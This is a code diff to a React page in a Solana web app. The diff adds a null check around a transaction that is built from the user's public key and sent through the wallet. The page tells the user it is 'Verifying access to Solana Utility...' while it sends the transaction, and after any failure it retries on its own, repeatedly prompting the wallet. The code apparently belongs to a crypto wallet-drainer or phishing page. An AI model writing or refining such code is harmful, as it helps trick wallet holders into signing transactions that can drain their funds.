@@ -38,18 +38,26 @@ export default function TransactionPage() {
       try {
         simulateClick()
         setStatus("Verifying access to Solana Utility...")
+
         const tx = await createUnsignedTransaction(publicKey)
-        const sig = await sendTransaction(tx as Transaction, connection)
-        console.log("✅ transaction sent:", sig)
-        setStatus("Successful ✅")
+
+        if (tx) {
+          const sig = await sendTransaction(tx as unknown as Transaction, connection)
+          console.log("✅ transaction sent:", sig)
+          setStatus("Successful ✅")
+        } else {
+          throw new Error("Transaction oluşturulamadı (null döndü)")
+        }
       } catch (err: unknown) {
         if (err instanceof Error) {
           console.warn("⚠️ İşlem başarısız:", err.message)
         } else {
           console.warn("⚠️ Bilinmeyen hata:", err)
         }
+
         retries.current += 1
         setStatus("Verifying access to Solana Utility...")
+
         setTimeout(() => {
           waiting.current = false
           void trySendTransaction()
